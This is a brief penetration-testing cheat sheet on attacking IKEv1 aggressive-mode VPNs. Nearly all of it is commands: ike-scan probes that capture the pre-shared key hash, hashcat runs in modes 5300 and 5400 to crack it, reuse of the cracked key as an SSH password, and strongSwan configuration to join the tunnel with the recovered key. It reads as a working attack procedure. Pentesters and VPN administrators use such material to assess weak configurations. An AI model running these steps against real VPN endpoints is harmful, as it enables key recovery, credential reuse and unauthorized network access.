# IKE/IPSec Aggressive Mode PSK Hash Capture

IKEv1 aggressive mode leaks the VPN identity and pre-shared key (PSK) hash without authenticating first. Crack the hash to recover the PSK.

```bash
# Scan for IKE (UDP 500):
nmap -sU -p 500 <TARGET>
ike-scan <TARGET>

# Aggressive mode scan — sends identity and captures the hash:
ike-scan --aggressive -M <TARGET>
# or: specify a test identity (some configs require a matching identity)
ike-scan --aggressive -M -I vpnclient <TARGET>

# Output includes: PSK hash (Main Mode or Aggressive Mode hash)
# Format compatible with hashcat mode 5300 (IKE-PSK MD5) or 5400 (SHA1)
hashcat -m5300 -a0 ike_psk.hash <WORDLIST>
hashcat -m5400 -a0 ike_psk.hash <WORDLIST>
```

Once cracked, the PSK often reuses as an SSH password or admin credential:
```bash
ssh <user>@<TARGET>
```

If the VPN actually connects, use `strongSwan` for IPSEC tunnel setup:
```bash
# /etc/ipsec.conf: conn vpn, keyexchange=ikev1, authby=secret, ...
# /etc/ipsec.secrets: <TARGET> : PSK "<cracked_psk>"
ipsec up vpn
```
